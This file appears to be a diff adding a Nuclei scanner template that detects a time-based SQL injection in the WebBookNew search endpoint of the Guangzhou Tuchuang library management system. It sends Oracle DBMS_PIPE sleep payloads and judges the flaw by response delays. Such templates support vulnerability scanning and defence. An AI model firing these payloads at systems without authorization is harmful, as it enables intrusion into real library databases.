@@ -1,0 +1,33 @@
+id: poc-yaml-guangzhou-tuchuang-webbooknew-sqli
+info:
+  name: "广州图创图书集群管理系统 WebBookNew SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 广州图创图书集群管理系统
+http:
+  - raw:
+      - |
+        GET /interlib/websearch/WebBookNew?cmdACT=search_BookNew&showpage=1&filter=1+AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', 5) HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Nuclei
+      - |
+        GET /interlib/websearch/WebBookNew?cmdACT=search_BookNew&showpage=1&filter=1+AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', 8) HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Nuclei
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: body
+        words:
+          - "<name>书目查询</name>"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+    matchers-condition: and
